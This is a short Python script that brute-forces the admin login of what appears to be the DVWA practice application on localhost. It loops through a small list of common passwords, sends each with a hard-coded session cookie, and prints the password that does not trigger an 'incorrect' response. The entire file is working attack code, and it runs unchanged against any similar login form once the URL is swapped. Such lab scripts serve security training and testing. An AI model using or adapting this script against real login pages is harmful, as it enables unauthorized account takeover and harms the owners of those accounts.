import requests

url = "http://127.0.0.1/vulnerabilities/brute/"
cookies = {"security": "low", "PHPSESSID": "be1c1eegp4g3brdu7c3bri5j70"}
passwords = ["123456", "password", "admin", "letmein", "password123"]

for pwd in passwords:
    params = {"username": "admin", "password": pwd, "Login": "Login"}
    r = requests.get(url, params=params, cookies=cookies)
    if "incorrect" not in r.text.lower():
        print(f"[+] SUCCESS -> username: admin | password: {pwd}")
        break
    else:
        print(f"[-] Failed -> {pwd}")
